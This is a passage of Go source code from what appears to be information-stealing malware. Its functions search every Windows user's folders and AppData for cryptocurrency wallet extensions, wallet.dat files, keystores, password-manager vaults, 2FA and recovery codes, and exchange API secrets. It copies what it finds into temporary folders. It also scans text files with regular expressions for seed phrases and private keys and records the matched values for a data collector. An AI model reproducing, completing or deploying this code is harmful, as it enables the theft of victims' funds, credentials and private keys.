				extensionsPath := filepath.Join(profilePath, "Extensions")
				
				if !fileutil.IsDir(extensionsPath) {
					continue
				}

				// Check each extension
				for extensionID, walletName := range extensions {
					extensionPath := filepath.Join(extensionsPath, extensionID)
					
					if !fileutil.IsDir(extensionPath) {
						continue
					}

					// Copy ENTIRE extension folder with ALL contents
					destPath := filepath.Join(tempDir, userName, strings.Replace(browserPath, "\\", "_", -1), profile.Name(), walletName+"_"+extensionID)
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

					if err := fileutil.CopyDir(extensionPath, destPath); err == nil {
						if size, err := fileutil.GetDirectorySize(destPath); err == nil {
							totalSize += size
							found++
						}
					}
				}
			}
		}
	}

	if found > 0 {
		extensionsInfo := map[string]interface{}{
			"WalletExtensionsFound": found,
			"TotalSizeMB":           totalSize / (1024 * 1024),
			"TreeView":              fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("wallet_extensions", extensionsInfo)
		dataCollector.AddDirectory("wallet_extensions", tempDir, "wallet_extensions")
	}
}

// WalletFiles - Search for wallet files in common locations
func WalletFiles(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "wallet-files-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	// Wallet-related keywords and file extensions
	walletKeywords := []string{
		"wallet", "bitcoin", "ethereum", "crypto", "seed", "mnemonic", "private", "key",
		"btc", "eth", "ltc", "doge", "xmr", "dash", "zec", "bch", "ada", "dot", "sol",
		"metamask", "exodus", "atomic", "electrum", "jaxx", "coinbase", "binance",
		"phrase", "recovery", "backup", "keystore", "utxo", "address", "transaction",
		"blockchain", "ledger", "trezor", "hardware", "cold", "hot", "paper",
		"coinomi", "mycelium", "breadwallet", "edge", "greenaddress", "samourai",
		"wasabi", "sparrow", "specter", "bluewallet", "phoenix", "muun", "zap",
		"eclair", "lnd", "clightning", "thunderhub", "rtl", "joule", "alby",
		"sphinx", "breez", "wallet3", "unstoppable", "ens", "handshake", "namebase",
	}

	walletExtensions := []string{
		".wallet", ".dat", ".key", ".keystore", ".json", ".txt", ".backup", ".bak",
		".seed", ".mnemonic", ".phrase", ".recovery", ".private", ".pub", ".pem",
		".p12", ".pfx", ".jks", ".aes", ".enc", ".gpg", ".pgp", ".kdb", ".kdbx",
		".1password", ".lastpass", ".dashlane", ".bitwarden", ".keepass", ".enpass",
	}

	found := 0
	totalSize := int64(0)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		// Search in common directories
		searchDirs := []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
			filepath.Join(user, "Dropbox"),
			filepath.Join(user, "Google Drive"),
			filepath.Join(user, "iCloud Drive"),
		}

		for _, dir := range searchDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				// Skip large files
				if info.Size() > 100*1024*1024 { // 100MB
					return nil
				}

				fileName := strings.ToLower(info.Name())
				fileExt := strings.ToLower(filepath.Ext(fileName))

				// Check for wallet extensions
				isWalletFile := false
				for _, ext := range walletExtensions {
					if fileExt == ext {
						isWalletFile = true
						break
					}
				}

				// Check for wallet keywords in filename
				if !isWalletFile {
					for _, keyword := range walletKeywords {
						if strings.Contains(fileName, keyword) {
							isWalletFile = true
							break
						}
					}
				}

				if isWalletFile {
					relPath, _ := filepath.Rel(user, path)
					destPath := filepath.Join(tempDir, userName, "WalletFiles", relPath)
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

					if err := fileutil.CopyFile(path, destPath); err == nil {
						totalSize += info.Size()
						found++
					}
				}

				return nil
			})
		}
	}

	if found > 0 {
		walletFilesInfo := map[string]interface{}{
			"WalletFilesFound": found,
			"TotalSizeMB":      totalSize / (1024 * 1024),
			"TreeView":         fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("wallet_files", walletFilesInfo)
		dataCollector.AddDirectory("wallet_files", tempDir, "wallet_files")
	}
}

// WalletDatFiles - Specific search for wallet.dat files
func WalletDatFiles(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "wallet-dat-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	// Common wallet.dat locations
	walletDatPaths := []string{
		"AppData\\Roaming\\Bitcoin\\wallets",
		"AppData\\Roaming\\Bitcoin",
		"AppData\\Local\\Bitcoin\\wallets",
		"AppData\\Local\\Bitcoin",
		"AppData\\Roaming\\Litecoin",
		"AppData\\Roaming\\DogeCoin",
		"AppData\\Roaming\\DashCore",
		"AppData\\Roaming\\Zcash",
		"AppData\\Roaming\\Electrum\\wallets",
		"AppData\\Roaming\\Electrum-LTC\\wallets",
		"AppData\\Roaming\\Exodus\\exodus.wallet",
		"AppData\\Roaming\\atomic\\Local Storage\\leveldb",
		"Desktop",
		"Documents",
		"Downloads",
	}

	found := 0
	totalSize := int64(0)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		for _, walletPath := range walletDatPaths {
			fullPath := filepath.Join(user, walletPath)
			
			if !fileutil.IsDir(fullPath) {
				continue
			}

			// Search for wallet.dat and similar files
			filepath.Walk(fullPath, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				fileName := strings.ToLower(info.Name())
				
				// Look for wallet files
				if strings.Contains(fileName, "wallet.dat") ||
				   strings.Contains(fileName, "wallet") ||
				   strings.Contains(fileName, ".dat") ||
				   strings.Contains(fileName, "keystore") ||
				   strings.Contains(fileName, "seed") ||
				   strings.Contains(fileName, "mnemonic") {
					
					relPath, _ := filepath.Rel(user, path)
					destPath := filepath.Join(tempDir, userName, "WalletDat", relPath)
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

					if err := fileutil.CopyFile(path, destPath); err == nil {
						totalSize += info.Size()
						found++
					}
				}

				return nil
			})
		}
	}

	if found > 0 {
		walletDatInfo := map[string]interface{}{
			"WalletDatFound": found,
			"TotalSizeMB":    totalSize / (1024 * 1024),
			"TreeView":       fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("wallet_dat", walletDatInfo)
		dataCollector.AddDirectory("wallet_dat", tempDir, "wallet_dat")
	}
}

// CryptoFiles - Advanced crypto detection in text files
func CryptoFiles(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "crypto-files-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	// Advanced regex patterns for crypto detection
	patterns := map[string]*regexp.Regexp{
		"mnemonic_12":           regexp.MustCompile(`(?i)\b([a-z]+\s+){11}[a-z]+\b`),
		"mnemonic_24":           regexp.MustCompile(`(?i)\b([a-z]+\s+){23}[a-z]+\b`),
		"bitcoin_private_key_5": regexp.MustCompile(`5[HJK][1-9A-HJ-NP-Za-km-z]{49}`),
		"bitcoin_private_key_K": regexp.MustCompile(`K[1-9A-HJ-NP-Za-km-z]{51}`),
		"bitcoin_private_key_L": regexp.MustCompile(`L[1-9A-HJ-NP-Za-km-z]{51}`),
		"ethereum_private_key":  regexp.MustCompile(`0x[a-fA-F0-9]{64}`),
		"bitcoin_address_1":     regexp.MustCompile(`1[a-km-zA-HJ-NP-Z1-9]{25,34}`),
		"bitcoin_address_3":     regexp.MustCompile(`3[a-km-zA-HJ-NP-Z1-9]{25,34}`),
		"bitcoin_address_bc1":   regexp.MustCompile(`bc1[a-z0-9]{39,59}`),
		"ethereum_address":      regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
		"litecoin_address":      regexp.MustCompile(`[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}`),
		"dogecoin_address":      regexp.MustCompile(`D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}`),
		"monero_address":        regexp.MustCompile(`4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}`),
		"dash_address":          regexp.MustCompile(`X[1-9A-HJ-NP-Za-km-z]{33}`),
		"zcash_address":         regexp.MustCompile(`t1[a-zA-Z0-9]{33}`),
		"ripple_address":        regexp.MustCompile(`r[0-9a-zA-Z]{24,34}`),
		"stellar_address":       regexp.MustCompile(`G[A-Z2-7]{55}`),
		"cardano_address":       regexp.MustCompile(`addr1[a-z0-9]+`),
		"tron_address":          regexp.MustCompile(`T[A-Za-z1-9]{33}`),
		"binance_address":       regexp.MustCompile(`bnb1[a-z0-9]{38}`),
		"solana_address":        regexp.MustCompile(`[1-9A-HJ-NP-Za-km-z]{32,44}`),
		"polygon_address":       regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
		"avalanche_address":     regexp.MustCompile(`X-avax1[a-z0-9]{38}`),
		"cosmos_address":        regexp.MustCompile(`cosmos1[a-z0-9]{38}`),
		"polkadot_address":      regexp.MustCompile(`1[a-zA-Z0-9]{47}`),
	}

	found := 0
	suspiciousFiles := make(map[string][]string)
	cryptoData := make(map[string]string)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		searchDirs := []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
		}

		for _, dir := range searchDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				// Check text files
				ext := strings.ToLower(filepath.Ext(info.Name()))
				textExts := []string{".txt", ".json", ".csv", ".log", ".md", ".rtf", ".dat", ".key", ".pem", ".backup", ".wallet"}
				isTextFile := false
				for _, textExt := range textExts {
					if ext == textExt {
						isTextFile = true
						break
					}
				}

				if !isTextFile || info.Size() > 10*1024*1024 { // 10MB limit
					return nil
				}

				content, err := fileutil.ReadFile(path)
				if err != nil {
					return nil
				}

				matches := make([]string, 0)
				for patternName, pattern := range patterns {
					if pattern.MatchString(content) {
						matches = append(matches, patternName)
						// Store actual matches
						foundMatches := pattern.FindAllString(content, -1)
						for _, match := range foundMatches {
							cryptoData[fmt.Sprintf("%s_%s", patternName, info.Name())] = match
						}
					}
				}

				if len(matches) > 0 {
					destPath := filepath.Join(tempDir, userName, "CryptoFiles", info.Name())
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
					
					if err := fileutil.CopyFile(path, destPath); err == nil {
						suspiciousFiles[info.Name()] = matches
						found++
					}
				}

				return nil
			})
		}
	}

	if found > 0 {
		// Create analysis file
		analysisPath := filepath.Join(tempDir, "CRYPTO_ANALYSIS.txt")
		analysisContent := "🔍 CRYPTO FILES ANALYSIS\n========================\n\n"
		analysisContent += fmt.Sprintf("Total suspicious files found: %d\n\n", found)
		
		for fileName, matches := range suspiciousFiles {
			analysisContent += fmt.Sprintf("📄 File: %s\n", fileName)
			analysisContent += fmt.Sprintf("🎯 Matches: %s\n", strings.Join(matches, ", "))
			analysisContent += "---\n\n"
		}
		
		if len(cryptoData) > 0 {
			analysisContent += "\n💰 FOUND CRYPTO DATA\n===================\n\n"
			for key, value := range cryptoData {
				analysisContent += fmt.Sprintf("%s: %s\n", key, value)
			}
		}
		
		os.WriteFile(analysisPath, []byte(analysisContent), 0644)

		cryptoFilesInfo := map[string]interface{}{
			"CryptoFilesFound": found,
			"SuspiciousFiles":  suspiciousFiles,
			"CryptoDataFound":  cryptoData,
			"TreeView":         fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("crypto_files", cryptoFilesInfo)
		dataCollector.AddDirectory("crypto_files", tempDir, "crypto_files")
	}
}

// ExchangeFiles - Search for exchange-related files
func ExchangeFiles(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "exchange-files-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	exchangeKeywords := []string{
		"binance", "coinbase", "kraken", "bitfinex", "huobi", "okex", "kucoin",
		"bybit", "ftx", "gate", "bittrex", "poloniex", "gemini", "bitstamp",
		"coincheck", "bitflyer", "liquid", "bithumb", "upbit", "korbit",
		"exchange", "trading", "api", "secret", "access", "token", "auth",
		"2fa", "backup", "codes", "recovery", "seed", "phrase", "mnemonic",
	}

	found := 0
	totalSize := int64(0)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		searchDirs := []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
		}

		for _, dir := range searchDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				fileName := strings.ToLower(info.Name())
				
				// Check for exchange keywords
				isExchangeFile := false
				for _, keyword := range exchangeKeywords {
					if strings.Contains(fileName, keyword) {
						isExchangeFile = true
						break
					}
				}

				if isExchangeFile {
					destPath := filepath.Join(tempDir, userName, "ExchangeFiles", info.Name())
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

					if err := fileutil.CopyFile(path, destPath); err == nil {
						totalSize += info.Size()
						found++
					}
				}

				return nil
			})
		}
	}

	if found > 0 {
		exchangeInfo := map[string]interface{}{
			"ExchangeFilesFound": found,
			"TotalSizeMB":        totalSize / (1024 * 1024),
			"TreeView":           fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("exchange_files", exchangeInfo)
		dataCollector.AddDirectory("exchange_files", tempDir, "exchange_files")
	}
}

// CryptoApps - Search for crypto application data
func CryptoApps(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "crypto-apps-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	cryptoAppPaths := map[string][]string{
		"TradingView": {
			"AppData\\Roaming\\TradingView",
			"AppData\\Local\\TradingView",
		},
		"Blockfolio": {
			"AppData\\Roaming\\Blockfolio",
			"AppData\\Local\\Blockfolio",
		},
		"CoinTracker": {
			"AppData\\Roaming\\CoinTracker",
			"AppData\\Local\\CoinTracker",
		},
		"Koinly": {
			"AppData\\Roaming\\Koinly",
			"AppData\\Local\\Koinly",
		},
		"CoinGecko": {
			"AppData\\Roaming\\CoinGecko",
			"AppData\\Local\\CoinGecko",
		},
		"CoinMarketCap": {
			"AppData\\Roaming\\CoinMarketCap",
			"AppData\\Local\\CoinMarketCap",
		},
		"Delta": {
			"AppData\\Roaming\\Delta",
			"AppData\\Local\\Delta",
		},
		"Coinstats": {
			"AppData\\Roaming\\Coinstats",
			"AppData\\Local\\Coinstats",
		},
	}

	found := 0
	totalSize := int64(0)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		for appName, paths := range cryptoAppPaths {
			for _, path := range paths {
				fullPath := filepath.Join(user, path)
				
				if !fileutil.IsDir(fullPath) {
					continue
				}

				destPath := filepath.Join(tempDir, userName, appName)
				os.MkdirAll(destPath, os.ModePerm)

				if err := fileutil.CopyDir(fullPath, destPath); err == nil {
					if size, err := fileutil.GetDirectorySize(destPath); err == nil {
						totalSize += size
						found++
					}
				}
			}
		}
	}

	if found > 0 {
		cryptoAppsInfo := map[string]interface{}{
			"CryptoAppsFound": found,
			"TotalSizeMB":     totalSize / (1024 * 1024),
			"TreeView":        fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("crypto_apps", cryptoAppsInfo)
		dataCollector.AddDirectory("crypto_apps", tempDir, "crypto_apps")
	}
}

// BlockchainFiles - Search for blockchain-related files
func BlockchainFiles(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "blockchain-files-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	blockchainPaths := map[string][]string{
		"Geth": {
			"AppData\\Roaming\\Ethereum\\geth",
			"AppData\\Local\\Ethereum\\geth",
		},
		"Parity": {
			"AppData\\Roaming\\Parity\\Ethereum",
			"AppData\\Local\\Parity\\Ethereum",
		},
		"IPFS": {
			"AppData\\Roaming\\.ipfs",
			"AppData\\Local\\.ipfs",
		},
		"Filecoin": {
			"AppData\\Roaming\\.lotus",
			"AppData\\Local\\.lotus",
		},
		"Chainlink": {
			"AppData\\Roaming\\.chainlink",
			"AppData\\Local\\.chainlink",
		},
	}

	found := 0
	totalSize := int64(0)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		for blockchainName, paths := range blockchainPaths {
			for _, path := range paths {
				fullPath := filepath.Join(user, path)
				
				if !fileutil.IsDir(fullPath) {
					continue
				}

				destPath := filepath.Join(tempDir, userName, blockchainName)
				os.MkdirAll(destPath, os.ModePerm)

				if err := fileutil.CopyDir(fullPath, destPath); err == nil {
					if size, err := fileutil.GetDirectorySize(destPath); err == nil {
						totalSize += size
						found++
					}
				}
			}
		}
	}

	if found > 0 {
		blockchainInfo := map[string]interface{}{
			"BlockchainFilesFound": found,
			"TotalSizeMB":          totalSize / (1024 * 1024),
			"TreeView":             fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("blockchain_files", blockchainInfo)
		dataCollector.AddDirectory("blockchain_files", tempDir, "blockchain_files")
	}
}